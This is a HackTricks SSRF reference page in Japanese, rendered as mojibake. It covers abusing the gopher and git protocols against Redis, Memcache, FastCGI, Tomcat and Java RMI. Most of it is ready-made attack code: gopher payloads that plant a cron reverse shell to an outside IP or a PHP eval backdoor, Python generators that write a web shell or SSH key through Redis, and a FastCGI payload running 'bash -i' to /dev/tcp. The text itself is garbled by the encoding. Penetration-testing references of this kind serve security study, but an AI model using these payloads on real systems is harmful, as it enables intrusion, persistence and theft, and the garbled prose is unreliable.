ä»¥ä¸‹ã¯ã€Gopherãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ã¦SSRFæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®ä¾‹ã§ã™ã€‚

```bash
curl gopher://attacker-server:70/_URL_
```

ã“ã®ä¾‹ã§ã¯ã€æ”»æ’ƒè€…ã¯Gopherã‚¹ã‚­ãƒ¼ãƒ ã‚’ä½¿ç”¨ã—ã¦è‡ªåˆ†ã®ã‚µãƒ¼ãƒãƒ¼ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¦ã„ã¾ã™ã€‚æ”»æ’ƒè€…ã¯"_URL_"ã®éƒ¨åˆ†ã‚’æ”»æ’ƒå¯¾è±¡ã®URLã«ç½®ãæ›ãˆã‚‹ã“ã¨ã§ã€æ”»æ’ƒå¯¾è±¡ã®ã‚µãƒ¼ãƒãƒ¼ã«å¯¾ã—ã¦ä»»æ„ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Gopherãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ãŸSSRFæ”»æ’ƒã¯ã€è„†å¼±ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚„ã‚µãƒ¼ãƒ“ã‚¹ã§ã‚ˆãè¦‹ã‚‰ã‚Œã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€Gopherã‚¹ã‚­ãƒ¼ãƒ ã‚’ä½¿ç”¨ã—ã¦æ”»æ’ƒå¯¾è±¡ã®ã‚µãƒ¼ãƒãƒ¼ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã€æ©Ÿå¯†æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚„ã‚µãƒ¼ãƒ“ã‚¹ã®é–‹ç™ºè€…ã¯ã€Gopherãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’é©åˆ‡ã«åˆ¶å¾¡ã—ã€SSRFæ”»æ’ƒã‚’é˜²ããŸã‚ã®é©åˆ‡ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã‚’å®Ÿè£…ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```bash
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```
**RCEã‚’ä»‹ã—ãŸã‚·ã‚§ãƒ«ã®ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ï¼ˆPHPï¼‰** - [Redis Getshellã®æ¦‚è¦](https://www.mdeditor.tw/pl/pBy0)
```python
#!/usr/bin/env python
# -*-coding:utf-8-*-

import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
shell="\n\n<?php phpinfo();?>\n\n"
filename="shell.php"
path="/var"
passwd=""

cmd=["flushall",
"set 1 {}".format(shell.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
CRLF="\r\n"
redis_arr = arr.split(" ")
cmd=""
cmd+="*"+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF
return cmd

if __name__=="__main__":
for x in cmd:
payload += urllib.quote(redis_format(x))
print payload
```
**authorized\_keysã‚’ä»‹ã—ãŸRCE** - [Redis Getshellã®æ¦‚è¦](https://www.mdeditor.tw/pl/pBy0)
```python
import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
# shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
sshpublic_key = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8IOnJUAt5b/5jDwBDYJTDULjzaqBe2KW3KhqlaY58XveKQRBLrG3ZV0ffPnIW5SLdueunb4HoFKDQ/KPXFzyvVjqByj5688THkq1RJkYxGlgFNgMoPN151zpZ+eCBdFZEf/m8yIb3/7Cp+31s6Q/DvIFif6IjmVRfWXhnkjNehYjsp4gIEBiiW/jWId5yrO9+AwAX4xSabbxuUyu02AQz8wp+h8DZS9itA9m7FyJw8gCrKLEnM7PK/ClEBevDPSR+0YvvYtnUxeCosqp9VrjTfo5q0nNg9JAvPMs+EA1ohUct9UyXbTehr1Bdv4IXx9+7Vhf4/qwle8HKali3feIZ root@kali\n\n"
filename="authorized_keys"
path="/root/.ssh/"
passwd=""
cmd=["flushall",
"set 1 {}".format(sshpublic_key.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
CRLF="\r\n"
redis_arr = arr.split(" ")
cmd=""
cmd+="*"+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF
return cmd

if __name__=="__main__":
for x in cmd:
payload += urllib.quote(redis_format(x))
print payload
```
**Gitãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä»‹ã—ãŸGitLabä¸Šã®RCE**

Liveoverflowã®ç´ æ™´ã‚‰ã—ã„è§£èª¬ã¯[ã“ã¡ã‚‰](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/)ã§ã™ã€‚

ã“ã‚Œã¯GitLabã¸ã®èªè¨¼æ¸ˆã¿ã‚¢ã‚¯ã‚»ã‚¹ãŒå¿…è¦ãªãŸã‚ã€ãƒãƒƒã‚­ãƒ³ã‚°å¯¾è±¡ã®ç’°å¢ƒã§`git`ãƒ—ãƒ­ãƒˆã‚³ãƒ«ãŒæ©Ÿèƒ½ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹å ´åˆã€ã“ã“ã«ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å«ã‚ã¦ã„ã¾ã™ã€‚ã“ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯å‚è€ƒç”¨ã§ã™ã€‚
```bash
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
# Memcache

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 11211**

* [vBulletin Memcache RCE](https://www.exploit-db.com/exploits/37815)
* [GitHub Enterprise Memcache RCE](https://www.exploit-db.com/exploits/42392)
* [Memcacheã®ãŸã‚ã®Gopherãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ä¾‹](https://blog.safebuff.com/2016/07/03/SSRF-Tips/#SSRF-memcache-Getshell)
```bash
gopher://[target ip]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a
gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a
```
# Apache Tomcat

**ä¸€èˆ¬ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 80ã€443 (SSL)ã€8080ã€8443 (SSL)**

Tomcat 6ã«å¯¾ã—ã¦æœ‰åŠ¹:

[gopher-tomcat-deployer](https://github.com/pimps/gopher-tomcat-deployer)

ã“ã®æŠ€è¡“ã‚’ä½¿ç”¨ã—ãŸCTFã®è§£èª¬:

[XXEã‹ã‚‰RCEã¸ï¼šPwn2Win CTF 2018 è§£èª¬](https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/)

# FastCGI

**ä¸€èˆ¬ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 80ã€443 (SSL)**

ã“ã‚Œã¯[ã“ã“](https://blog.chaitin.cn/gopher-attack-surfaces/)ã‹ã‚‰å–å¾—ã•ã‚Œã¾ã—ãŸã€‚
```bash
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
```
# Java RMI

**ä¸€èˆ¬çš„ã«ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãƒãƒ¼ãƒˆ: 1090,1098,1099,1199,4443-4446,8999-9010,9999**

ä»»æ„ã®ãƒã‚¤ãƒˆï¼ˆgopherãƒ™ãƒ¼ã‚¹ï¼‰ã‚’è¨±å¯ã™ã‚‹ç›²ç›®ã®SSRFè„†å¼±æ€§ã¯ã€Java RMIã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆï¼ˆRMIãƒ¬ã‚¸ã‚¹ãƒˆãƒªã€åˆ†æ•£ã‚¬ãƒ™ãƒ¼ã‚¸ã‚³ãƒ¬ã‚¯ã‚¿ã€ã‚¢ã‚¯ãƒ†ã‚£ãƒ™ãƒ¼ã‚·ãƒ§ãƒ³ã‚·ã‚¹ãƒ†ãƒ ï¼‰ã«å¯¾ã—ã¦ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã¾ãŸã¯ã‚³ãƒ¼ãƒ‰ãƒ™ãƒ¼ã‚¹æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚è©³ç´°ãªè§£èª¬ã¯[ã“ã¡ã‚‰](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ãƒªã‚¹ãƒˆã¯ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ç”Ÿæˆã®ä¾‹ã‚’ç¤ºã—ã¦ã„ã¾ã™ï¼š
```
$ rmg serial 127.0.0.1 1090 CommonsCollections6 'curl example.burpcollaborator.net' --component reg --ssrf --gopher
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI Registry endpoint...
[+]
[+] 	SSRF Payload: gopher://127.0.0.1:1090/_%4a%52%4d%49%00%02%4c%50%ac%ed%00%05%77%22%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%02%44%15%4d[...]
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
